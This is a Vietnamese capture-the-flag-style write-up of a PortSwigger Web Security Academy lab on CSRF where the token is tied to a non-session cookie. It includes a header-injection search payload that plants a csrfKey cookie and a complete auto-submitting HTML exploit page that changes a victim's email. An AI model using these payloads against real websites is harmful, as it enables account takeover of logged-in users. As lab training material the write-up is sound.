### Web Academy PortSwigger
* Lab: [Lab: CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)
* Descript: This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
* To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
* Solved and Writeup by Tung !
  
* ![Ảnh chụp màn hình 2023-11-30 095922](https://hackmd.io/_uploads/Hy4a9_BBT.png)

Đọc qua mô tả và tiêu đề, chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF. Nó sử dụng token CSRF nhưng chúng không được tích hợp hoàn toàn vào hệ thống xử lý phiên của trang web.

Ta cũng có 2 tài khoản được cung cấp là `wiener` , `carlos` , Access now!

![Ảnh chụp màn hình 2023-11-30 100726](https://hackmd.io/_uploads/H18jCuSHp.png)

Giao diện quen thuộc như trên , để test chức năng change email , trước tiên đăng nhập với `wiener`:  

![Ảnh chụp màn hình 2023-11-30 100940](https://hackmd.io/_uploads/H1IbJFrBp.png)

Mở BurpSuite lên ,chặn request change email ,chuyển đến repeater :

![Ảnh chụp màn hình 2023-11-30 101439](https://hackmd.io/_uploads/BJxFkFrHa.png)

---
![Ảnh chụp màn hình 2023-11-30 102147](https://hackmd.io/_uploads/B1LkeKSSp.png)

Ta thấy phần `Cookie` có cả `session` và `csrfKey` , phần thân chứa `csrf` . 
Sau một hồi kiểm tra , ta thấy khi thay đổi giá trị `crsfKey` ,`crsf` , phản hồi trả về lỗi *Invalid CSRF token*: 

![Ảnh chụp màn hình 2023-11-30 102739](https://hackmd.io/_uploads/Bkh9WKBBT.png)

Phản hồi khi ta chỉ thay đổi `session` : 

![Ảnh chụp màn hình 2023-11-30 102654](https://hackmd.io/_uploads/B11pWKBBa.png)

Có thể thấy , ta sẽ bị chuyển đến trang `login` để đăng nhập và được tạo một session mới !
Dựa theo đề bài , ta có suy luận có thể  `csrf token` và `session` không ràng buộc với nhau. Ta có ý tưởng lấy `crsf token` của tài khác để đăng nhập :  

![Ảnh chụp màn hình 2023-11-30 103354](https://hackmd.io/_uploads/H1gJQYrrp.png)

Đăng nhập với user `carlos` !

---
![Ảnh chụp màn hình 2023-11-30 103416](https://hackmd.io/_uploads/SJgrAGKHra.png)

Ta lấy được crsf token của `carlos` :  

![Ảnh chụp màn hình 2023-11-30 103712](https://hackmd.io/_uploads/BJDNNYHB6.png)

![Ảnh chụp màn hình 2023-11-30 103828](https://hackmd.io/_uploads/ryVBEYHrp.png)

Sử dụng crsf token (của người dùng `carlos`) này trong repeater request của tài khoản `wiener` :  

![Ảnh chụp màn hình 2023-11-30 104255](https://hackmd.io/_uploads/ryIGSKHBp.png)
Ta thấy request được chấp nhận và không trả về lỗi!
Do `csrfKey` nằm trong phần `Head` request , ta phải tìm cách để thay đổi `csrfKey` trên tài khoản nạn nhân ! 
Xem qua `search function` :  

![Ảnh chụp màn hình 2023-11-30 104847](https://hackmd.io/_uploads/S1F0PFrra.png)
Thử search Nothing! 

![Ảnh chụp màn hình 2023-11-30 105935](https://hackmd.io/_uploads/BkyytKBrp.png)

Ta thấy không có csrf đính kèm trong body GET request , từ lỗ hổng này , ta chèn sử dụng Set-Cookie nhằm thay đổi `csrfKey` :  
`/?search=Nothing
Set-Cookie: csrfKey=V0GEMWnzSuLcPXgbYHa6KlhFqkoR8mhj (crsfKey của carlos); SameSite=None
`

*(SameSite=None:  cho phép trình duyệt gửi cookie đó cùng với các yêu cầu từ các trang web khác)*

Tiến hành tạo link web lừa nạn nhân nhấp vào , sau đó có thể thay đổi email nạn nhân : 

```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0ae600a403cfd8df84cc549200f000ee.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="occupied1234@gmail.com" />

      <input type="hidden" name="csrf" value="ZiMozVd56a2rrssHNzCTU66nYxKYThq3" />

      <input type="submit" value="Submit request" />

    </form>

<img src="https://0ae600a403cfd8df84cc549200f000ee.web-security-academy.net/?search=Nothing
Set-Cookie: csrfKey=V0GEMWnzSuLcPXgbYHa6KlhFqkoR8mhj; SameSite=None" onerror="document.forms[0].submit()">

  </body>

</html>
```
Ta gửi tới người dùng `wiener` , dùng `crsfKey` và `csrf` của người dùng `carlos` , tạo POST request để thay đổi email thành `occupied1234@gmail.com` ,paste đoạn html trên vào body trên `server exloit` :  

![Ảnh chụp màn hình 2023-11-30 115634](https://hackmd.io/_uploads/rkg8IqBBp.png)

*Deliver exploit to victim*
And... 

![Ảnh chụp màn hình 2023-11-30 115032](https://hackmd.io/_uploads/B14oL5rHp.png)

Lab done! Ta đã thay đổi thành công email nạn nhân thành `occupied1234@gmail.com` 

*Note: Những cuộc tấn công CRSF chỉ khả dụng khi người dùng nạn nhân hiện đã đăng nhập và nhấp vào liên kết độc hại.*
